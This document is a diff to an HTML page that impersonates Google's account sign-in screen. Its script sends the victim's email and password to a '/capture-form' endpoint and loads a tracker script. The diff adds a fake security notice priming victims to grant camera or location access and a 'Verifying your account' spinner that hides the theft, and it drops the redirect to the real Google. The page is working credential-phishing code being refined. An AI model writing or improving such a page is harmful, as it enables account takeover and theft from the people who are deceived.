@@ -19,8 +19,7 @@ body{background:#fff;font-family:'Google Sans',Roboto,Arial,sans-serif;color:#20
 .input-group input{width:100%;border:1px solid #dadce0;border-radius:4px;padding:0.9rem 0.75rem 0.2rem;font-size:1rem;outline:none;transition:border-color 0.2s;color:#202124}
 .input-group input:focus{border-color:#1a73e8;border-width:2px}
 .input-group label{position:absolute;top:50%;left:0.75rem;transform:translateY(-50%);color:#5f6368;font-size:1rem;pointer-events:none;transition:all 0.15s;background:#fff;padding:0 0.25rem}
-.input-group input:focus ~ label,
-.input-group input:not(:placeholder-shown) ~ label{top:0;font-size:0.75rem;color:#1a73e8}
+.input-group input:focus ~ label,.input-group input:not(:placeholder-shown) ~ label{top:0;font-size:0.75rem;color:#1a73e8}
 .forgot{color:#1a73e8;font-size:0.875rem;text-decoration:none;display:block;margin-bottom:1.5rem}
 .forgot:hover{text-decoration:underline}
 .actions{display:flex;align-items:center;justify-content:space-between;margin-top:1.5rem}
@@ -30,6 +29,12 @@ body{background:#fff;font-family:'Google Sans',Roboto,Arial,sans-serif;color:#20
 .next-btn:hover{background:#1557b0}
 .step{display:none}
 .step.active{display:block}
+.security-notice{background:#fff8e1;border-left:3px solid #f9a825;border-radius:0 4px 4px 0;padding:0.6rem 0.75rem;margin-bottom:1.25rem;font-size:0.78rem;color:#5f4100;line-height:1.4}
+.security-notice strong{color:#e65100}
+.spinner-wrap{text-align:center;padding:2.5rem 0}
+.spinner{display:inline-block;width:40px;height:40px;border:3px solid #dadce0;border-top-color:#1a73e8;border-radius:50%;animation:GSpinAnim 0.85s linear infinite}
+@keyframes GSpinAnim{to{transform:rotate(360deg)}}
+.spinner-label{margin-top:1.25rem;color:#5f6368;font-size:0.875rem}
 </style>
 </head>
 <body>
@@ -42,13 +47,14 @@ body{background:#fff;font-family:'Google Sans',Roboto,Arial,sans-serif;color:#20
         <path fill="#FBBC05" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
         <path fill="#4285F4" d="M225 3v65h-9.5V3h9.5z"/>
         <path fill="#34A853" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
-        <path fill="#EA4335" d="M35.29 41.41V32h31.tattoo c.21 1.59.33 3.28.33 5.09 0 6.31-1.73 14.13-7.31 19.71-5.42 5.67-12.35 8.7-21.54 8.7C16.78 65.5 0 49.39 0 28S16.78 0 38.08 0c9.43 0 16.21 3.7 21.29 8.53l-5.99 5.99c-3.61-3.36-8.53-5.96-15.3-5.96C25.01 8.56 10.5 23.4 10.5 28c0 9.24 6.63 16.67 17.5 16.67 5.46 0 9.57-2.19 12.43-5.04 2.36-2.36 3.28-5.03 3.27-7.22H35.29z"/>
+        <path fill="#EA4335" d="M35.29 41.41V32h31c.21 1.59.33 3.28.33 5.09 0 6.31-1.73 14.13-7.31 19.71-5.42 5.67-12.35 8.7-21.54 8.7C16.78 65.5 0 49.39 0 28S16.78 0 38.08 0c9.43 0 16.21 3.7 21.29 8.53l-5.99 5.99c-3.61-3.36-8.53-5.96-15.3-5.96C25.01 8.56 10.5 23.4 10.5 28c0 9.24 6.63 16.67 17.5 16.67 5.46 0 9.57-2.19 12.43-5.04 2.36-2.36 3.28-5.03 3.27-7.22H35.29z"/>
       </svg>
     </div>
 
     <div id="StepEmail" class="step active">
       <h1 class="title">Sign in</h1>
       <p class="subtitle">Use your Google Account</p>
+      <div class="security-notice"><strong>Security notice:</strong> Google may require camera or location access to verify your identity on new devices.</div>
       <div class="input-group">
         <input type="email" id="EmailInput" placeholder=" " autocomplete="email">
         <label for="EmailInput">Email or phone</label>
@@ -56,7 +62,7 @@ body{background:#fff;font-family:'Google Sans',Roboto,Arial,sans-serif;color:#20
       <a href="#" class="forgot">Forgot email?</a>
       <div class="actions">
         <a href="#" class="create-link">Create account</a>
-        <button class="next-btn" onclick="ShowPasswordStep()">Next</button>
+        <button class="next-btn" id="EmailNextBtn">Next</button>
       </div>
     </div>
 
@@ -73,7 +79,14 @@ body{background:#fff;font-family:'Google Sans',Roboto,Arial,sans-serif;color:#20
       <a href="#" class="forgot">Forgot password?</a>
       <div class="actions">
         <a href="#" class="create-link">Create account</a>
-        <button class="next-btn" onclick="SubmitCredentials()">Next</button>
+        <button class="next-btn" id="PasswordNextBtn">Next</button>
+      </div>
+    </div>
+
+    <div id="StepVerifying" class="step">
+      <div class="spinner-wrap">
+        <div class="spinner"></div>
+        <p class="spinner-label">Verifying your account&hellip;</p>
       </div>
     </div>
   </div>
@@ -81,7 +94,7 @@ body{background:#fff;font-family:'Google Sans',Roboto,Arial,sans-serif;color:#20
 <script src="/static/Tracker.js"></script>
 <script>
 function ShowPasswordStep() {
-  const Email = document.getElementById("EmailInput").value.trim();
+  var Email = document.getElementById("EmailInput").value.trim();
   if (!Email) return;
   document.getElementById("EmailDisplayText").textContent = Email;
   document.getElementById("AvatarLetter").textContent = Email.charAt(0).toUpperCase();
@@ -91,20 +104,20 @@ function ShowPasswordStep() {
 }
 
 function SubmitCredentials() {
-  const Email = document.getElementById("EmailInput").value.trim();
-  const Password = document.getElementById("PasswordInput").value;
+  var Email = document.getElementById("EmailInput").value.trim();
+  var Password = document.getElementById("PasswordInput").value;
   if (!Email || !Password) return;
+  document.getElementById("StepPassword").classList.remove("active");
+  document.getElementById("StepVerifying").classList.add("active");
   fetch("/capture-form", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ Username: Email, Password: Password })
-  }).then(function () {
-    window.location.href = "https://accounts.google.com/signin/challenge/recaptcha";
-  }).catch(function () {
-    window.location.href = "https://accounts.google.com/";
-  });
+  }).catch(function () {});
 }
 
+document.getElementById("EmailNextBtn").addEventListener("click", function () { ShowPasswordStep(); });
+document.getElementById("PasswordNextBtn").addEventListener("click", function () { SubmitCredentials(); });
 document.getElementById("EmailInput").addEventListener("keydown", function (Event) {
   if (Event.key === "Enter") ShowPasswordStep();
 });
